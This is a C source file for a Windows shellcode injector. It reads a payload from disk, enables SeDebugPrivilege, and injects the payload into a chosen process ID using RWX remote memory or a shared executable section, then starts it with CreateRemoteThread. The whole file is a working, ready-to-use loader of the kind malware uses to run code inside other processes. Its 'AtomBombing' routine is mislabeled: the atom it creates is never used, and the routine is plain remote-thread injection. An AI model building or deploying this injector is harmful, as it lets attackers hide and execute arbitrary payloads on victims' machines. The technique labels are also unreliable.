#include <windows.h>
#include <stdio.h>
#include <string.h>

// Function to read shellcode from a file
BOOL ReadShellcode(const char* filePath, BYTE** shellcode, SIZE_T* size) {
    FILE* file = fopen(filePath, "rb");
    if (!file) {
        printf("[-] Error opening shellcode file: %s\n", filePath);
        return FALSE;
    }

    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    fseek(file, 0, SEEK_SET);

    *shellcode = (BYTE*)malloc(*size);
    if (!*shellcode) {
        printf("[-] Memory allocation failed for shellcode\n");
        fclose(file);
        return FALSE;
    }

    fread(*shellcode, 1, *size, file);
    printf("[+] Read %zu bytes from %s\n", *size, filePath);
    fclose(file);
    return TRUE;
}

// AtomBombing Injection
BOOL AtomBombingInjection(DWORD pid, BYTE* shellcode, SIZE_T shellcodeSize) {
    printf("[*] Starting AtomBombing injection into PID %lu\n", pid);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open process %lu: %lu\n", pid, GetLastError());
        return FALSE;
    }

    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Allocated memory at %p in target process\n", remoteBuffer);

    WCHAR atomName[256];
    swprintf(atomName, L"Shellcode_%lu", GetTickCount());
    ATOM atom = GlobalAddAtomW(atomName);
    if (!atom) {
        printf("[-] GlobalAddAtomW failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Added atom: %ws\n", atomName);

    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, NULL)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        GlobalDeleteAtom(atom);
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Wrote shellcode to target process\n");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
        GlobalDeleteAtom(atom);
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Shellcode injected via AtomBombing into process %lu\n", pid);
    GlobalDeleteAtom(atom);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

// Section View Injection
BOOL SectionViewInjection(DWORD pid, BYTE* shellcode, SIZE_T shellcodeSize) {
    printf("[*] Starting Section View injection into PID %lu\n", pid);
    HANDLE hSection = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, shellcodeSize, NULL);
    if (!hSection) {
        printf("[-] CreateFileMappingW failed: %lu\n", GetLastError());
        return FALSE;
    }

    LPVOID localBuffer = MapViewOfFile(hSection, FILE_MAP_WRITE, 0, 0, shellcodeSize);
    if (!localBuffer) {
        printf("[-] MapViewOfFile (local) failed: %lu\n", GetLastError());
        CloseHandle(hSection);
        return FALSE;
    }
    printf("[+] Mapped local section at %p\n", localBuffer);

    memcpy(localBuffer, shellcode, shellcodeSize);
    printf("[+] Copied shellcode to local section\n");

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open process %lu: %lu\n", pid, GetLastError());
        UnmapViewOfFile(localBuffer);
        CloseHandle(hSection);
        return FALSE;
    }

    LPVOID remoteBuffer = MapViewOfFile2(hSection, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        printf("[-] MapViewOfFile2 (remote) failed: %lu\n", GetLastError());
        UnmapViewOfFile(localBuffer);
        CloseHandle(hSection);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Mapped remote section at %p\n", remoteBuffer);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
        UnmapViewOfFile(localBuffer);
        CloseHandle(hSection);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Shellcode injected via Section View into process %lu\n", pid);
    UnmapViewOfFile(localBuffer);
    CloseHandle(hSection);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

int main(int argc, char* argv[]) {
    printf("[*] Injector started at %s\n", __TIME__);
    if (argc != 4) {
        printf("[-] Usage: %s <method> <target_PID> <shellcode_file>\n", argv[0]);
        printf("[-] Methods: atombombing, sectionview\n");
        return 1;
    }

    const char* method = argv[1];
    DWORD pid = atoi(argv[2]);
    const char* shellcodeFile = argv[3];

    BYTE* shellcode = NULL;
    SIZE_T shellcodeSize = 0;
    if (!ReadShellcode(shellcodeFile, &shellcode, &shellcodeSize)) {
        return 1;
    }

    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        printf("[+] Enabled SeDebugPrivilege\n");
        CloseHandle(hToken);
    }
    else {
        printf("[-] Failed to enable SeDebugPrivilege: %lu\n", GetLastError());
    }

    BOOL success = FALSE;
    if (_stricmp(method, "atombombing") == 0) {
        success = AtomBombingInjection(pid, shellcode, shellcodeSize);
    }
    else if (_stricmp(method, "sectionview") == 0) {
        success = SectionViewInjection(pid, shellcode, shellcodeSize);
    }
    else {
        printf("[-] Invalid method: %s\n", method);
        printf("[-] Methods: atombombing, sectionview\n");
    }

    free(shellcode);
    printf("[*] Injector finished %s\n", success ? "successfully" : "with errors");
    return success ? 0 : 1;
}
